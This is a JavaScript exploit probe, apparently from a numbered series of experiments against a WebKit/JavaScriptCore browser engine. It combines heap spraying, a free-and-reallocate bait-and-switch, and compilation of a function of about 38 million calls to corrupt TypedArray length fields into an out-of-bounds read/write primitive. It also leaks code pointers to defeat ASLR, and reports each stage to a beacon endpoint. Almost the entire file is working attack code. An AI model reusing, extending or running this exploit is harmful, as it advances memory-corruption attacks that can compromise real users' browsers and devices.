// p151a — Combined ASLR leak + TypedArray corruption probe
//
// Tests BOTH Stage 1 and Stage 2 in one compilation:
// 1. Bait-and-switch spray for ASLR leak (p150f logic)
// 2. TypedArray targets to detect compile-time m_length corruption
//
// Key insight: finishCreation writes 4.3GB forward from MetadataTable.
// MADV_FREE preserves virtual mappings → sweep doesn't crash (p142 confirmed).
// MarkedSpace blocks are in same marge heap (tryFastAlignedMalloc → bmalloc).
// If TypedArray cells are at higher addresses, finishCreation writes to them:
//   entry+24 (thunk address, 8B) at cell offset 24 = m_length → huge length → OOB R/W
//
// Beacon prefix: V151A-

(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V151A-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function readU32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }
  function readHex8(view, off) {
    var hex = '';
    for (var h = 7; h >= 0; h--) hex += hexByte(view[off + h]);
    return hex;
  }
  function anyNonZero(view, off, len) {
    for (var b = 0; b < len; b++) { if (view[off + b] !== 0) return true; }
    return false;
  }

  BS('BOOT');

  var BUF_SZ = 100096;
  var SPRAY_COUNT = 300;
  var TARGET_COUNT = 2000;

  // ---- PHASE 1: Spray ArrayBuffers for bait-and-switch ----
  BS('SPRAY-START');
  var sprays = [];
  var sViews = [];
  for (var i = 0; i < SPRAY_COUNT; i++) {
    var ab = new ArrayBuffer(BUF_SZ);
    sprays.push(ab);
    sViews.push(new Uint8Array(ab));
  }
  BS('SPRAY-' + SPRAY_COUNT);

  // ---- PHASE 2: Free even-indexed buffers ----
  for (var i = 0; i < SPRAY_COUNT; i += 2) {
    sprays[i] = null;
    sViews[i] = null;
  }
  BS('FREE-DONE');

  for (var g = 0; g < 8; g++) {
    var garbage = new Array(50000);
    for (var j = 0; j < 50000; j++) garbage[j] = new ArrayBuffer(256);
    garbage = null;
  }
  BS('GC-DONE');

  // ---- PHASE 3: Allocate TypedArray targets AFTER spray ----
  // These go into MarkedSpace blocks. Blocks allocated AFTER spray
  // are more likely at higher addresses → in the OOB sweep path.
  BS('TARGETS-START');
  var targets = [];
  for (var t = 0; t < TARGET_COUNT; t++) {
    targets.push(new Uint8Array(16));
  }
  BS('TARGETS-' + TARGET_COUNT);

  // Fill each target with marker pattern so we can verify integrity
  for (var t = 0; t < TARGET_COUNT; t++) {
    var ta = targets[t];
    ta[0] = 0xAA;
    ta[1] = (t >> 8) & 0xFF;
    ta[2] = t & 0xFF;
    ta[15] = 0x55;
  }

  // ---- PHASE 4: Compile 38M function ----
  var N = 38348816;
  BS('BUILD-N' + N);

  var CHUNK = 4000000;
  var chunksN = Math.floor(N / CHUNK);
  var rem = N - chunksN * CHUNK;

  var callChunk = 'a();'.repeat(CHUNK);
  var parts = new Array(chunksN + 3);
  parts[0] = 'window.__p151fn=function(a){';
  for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
  parts[chunksN + 1] = 'a();'.repeat(rem);
  parts[chunksN + 2] = '};window.__p151ok=1;';
  callChunk = null;

  var blob = new Blob(parts, { type: 'application/javascript' });
  BS('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { BS('SCRIPT-ERR'); };
  sc.onload = function() {
    var ok = window.__p151ok ? 'OK' : 'FAIL';
    BS('COMPILED-' + ok);
    if (ok === 'OK') setTimeout(phaseScan, 100);
  };
  document.head.appendChild(sc);
  sc.src = url;

  // ---- PHASE 5: Scan for ASLR leak + TypedArray corruption ----
  function phaseScan() {
    BS('SCAN-START');

    // 5A: Check TypedArray targets for length corruption
    var corrupted = 0;
    var firstCorruptIdx = -1;
    var firstCorruptLen = 0;
    var corruptedTarget = null;

    for (var t = 0; t < TARGET_COUNT; t++) {
      var ta = targets[t];
      var len = ta.length;
      if (len !== 16) {
        corrupted++;
        if (firstCorruptIdx === -1) {
          firstCorruptIdx = t;
          firstCorruptLen = len;
          corruptedTarget = ta;
        }
        if (corrupted <= 5) {
          // Report length as hex (it should be the thunk address)
          var lenHex;
          try {
            lenHex = len.toString(16);
          } catch (e) {
            lenHex = 'ERR';
          }
          BS('CORRUPT-T' + t + '-LEN-' + lenHex);
        }
      }
    }

    BS('TRESULT-' + corrupted + '-of-' + TARGET_COUNT);

    // 5B: Check if corrupted target's data is still accessible
    if (corruptedTarget && firstCorruptLen > 16) {
      BS('OOB-CHECK');
      try {
        // Try reading past original length
        var b16 = corruptedTarget[16];
        var b17 = corruptedTarget[17];
        var b100 = corruptedTarget[100];
        BS('OOB-READ-16=' + b16.toString(16) + '-17=' + b17.toString(16) + '-100=' + b100.toString(16));

        // Read 8 bytes at offset 0 of next cell (should be structureID etc)
        var peekHex = '';
        for (var p = 16; p < 24 && p < firstCorruptLen; p++) {
          peekHex += hexByte(corruptedTarget[p]);
        }
        BS('PEEK-' + peekHex);

        BS('OOB-PRIMITIVE-CONFIRMED');
      } catch (e) {
        BS('OOB-CRASH-' + e.message.substring(0, 30));
      }
    }

    // 5C: Check data integrity of uncorrupted targets
    var intactData = 0;
    var corruptData = 0;
    for (var t = 0; t < Math.min(100, TARGET_COUNT); t++) {
      var ta = targets[t];
      if (ta.length === 16) {
        if (ta[0] === 0xAA && ta[15] === 0x55) intactData++;
        else corruptData++;
      }
    }
    BS('DATA-OK' + intactData + '-BAD' + corruptData);

    // 5D: Scan spray buffers for ASLR leak (p150f logic)
    var hitBufs = 0;
    var leakedPtrs = [];

    var scanOrder = [];
    for (var s = 1; s < sViews.length; s += 2) scanOrder.push(s);
    for (var s = 0; s < sViews.length; s += 2) scanOrder.push(s);

    for (var si = 0; si < scanOrder.length; si++) {
      var idx = scanOrder[si];
      var view = sViews[idx];
      if (!view) continue;

      var nz = 0;
      var firstOff = -1;
      for (var j = 0; j < view.length; j++) {
        if (view[j] !== 0) {
          if (firstOff === -1) firstOff = j;
          nz++;
        }
      }

      if (nz > 0) {
        hitBufs++;
        if (hitBufs <= 3) BS('HIT-' + idx + '-nz' + nz + '-f' + firstOff);

        var entryBase = firstOff;
        if (entryBase + 112 < view.length && !anyNonZero(view, entryBase + 112, 8)) {
          entryBase = firstOff - (firstOff % 112);
        }

        var ptrsDumped = 0;
        for (var entryOff = entryBase; entryOff + 72 <= view.length && ptrsDumped < 5; entryOff += 112) {
          var ptrOff = entryOff + 24;
          if (ptrOff + 8 > view.length) break;
          if (!anyNonZero(view, ptrOff, 8)) continue;

          var hex = readHex8(view, ptrOff);
          BS('THUNK-' + ptrsDumped + '=' + hex);
          ptrsDumped++;
          if (leakedPtrs.length < 3) leakedPtrs.push(hex);
        }
      }
    }

    BS('SPRAY-HITS-' + hitBufs);

    if (leakedPtrs.length > 0) {
      BS('ASLR-LEAK');
      for (var p = 0; p < leakedPtrs.length; p++) {
        BS('PTR' + p + '=' + leakedPtrs[p]);
      }
    }

    if (corrupted > 0 && leakedPtrs.length > 0) {
      BS('BOTH-STAGES-HIT');
    }

    BS('DONE');
  }
})();
